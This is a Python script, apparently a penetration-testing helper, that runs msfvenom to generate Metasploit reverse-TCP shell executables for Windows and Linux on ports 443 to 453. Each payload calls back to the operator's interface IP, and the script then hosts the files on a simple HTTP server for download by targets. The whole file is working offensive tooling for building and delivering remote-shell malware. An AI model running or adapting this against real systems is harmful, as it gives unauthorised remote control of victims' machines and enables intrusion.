#!/usr/bin/python3
''' Script for automatically generating msf payloads
'''
import argparse
import http.server
import os
import socketserver
import subprocess
import sys

import net_utils

DIR = os.path.dirname(os.path.realpath(__file__))
PAYLOAD_DIR = os.path.join(DIR, "payloads")

PAYLOADS = {
    "windows/x64/shell/reverse_tcp": "rshell64-%d.exe",
    "windows/shell/reverse_tcp": "rshell32-%d.exe",
    "linux/x64/shell/reverse_tcp": "rshell64-%d",
    "linux/x86/shell/reverse_tcp": "rshell32-%d"
}
PORTS = range(443,454)

def check_msfvenom():
    ret = subprocess.run(["which", "msfvenom"], stdout=subprocess.DEVNULL)
    if ret.returncode is not 0:
        sys.exit("[ERROR] Could not find msfvenom in you path")


def gen_reverse_shell(payload, out_file, lhost, lport):
    desc = "%s -> %s -> tcp:%s:%d" % (out_file, payload, lhost, lport)
    exe_format = "exe" if payload.startswith("windows") else "elf"
    ret = subprocess.run([
        "msfvenom", "-p", payload, "LHOST=%s" % lhost, "LPORT=%d" % lport,
        "-o", out_file, "-f", exe_format], stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL)
    if ret.returncode is not 0:
        print("Error generating: %s" % desc)
    else:
        print(desc)


def gen_payloads(lhost, iface_dir):
    for payload in PAYLOADS.keys():
        for port in PORTS:
            filename = PAYLOADS[payload] % port
            abs_path = os.path.join(iface_dir, filename)
            if not os.path.exists(abs_path):
                gen_reverse_shell(payload, abs_path, lhost, port)


def host_payloads(lhost, lport, hosting_dir):
    Handler = http.server.SimpleHTTPRequestHandler
    os.chdir(hosting_dir)

    with socketserver.TCPServer((lhost, lport), Handler) as httpd:
        print ("Serving payloads on http://%s:%d/..." % (lhost, lport))
        httpd.serve_forever()
    

def main():
    """ Main function for handling user arguments
    """

    # validate that msfvenom is installed, this is a strict dependency
    check_msfvenom()

    # parse user arguments
    parser = argparse.ArgumentParser(description='Gernerate and host msfvenom reverse payloads for ')
    parser.add_argument('interface',
            help='name of the interface that will host payloads and be called back to')
    parser.add_argument('-l', dest='listen_port', default=-1, type=int, nargs="?",
            help='port to host the payloads on; defaults to 80 if only flag is provided')
    args = parser.parse_args()

    # get interface ip
    ip = net_utils.get_iface_ipv4(args.interface)

    # verify payload dir exists
    iface_dir = os.path.join(PAYLOAD_DIR, ip)
    if not os.path.exists(iface_dir):
        os.makedirs(iface_dir)

    # generate payloads
    gen_payloads(ip, iface_dir)

    # get default listen port
    listener = 80 if args.listen_port is None else args.listen_port

    # host payloads
    if listener > 0:
        host_payloads(ip, listener, iface_dir)


if __name__ == "__main__":
    main()
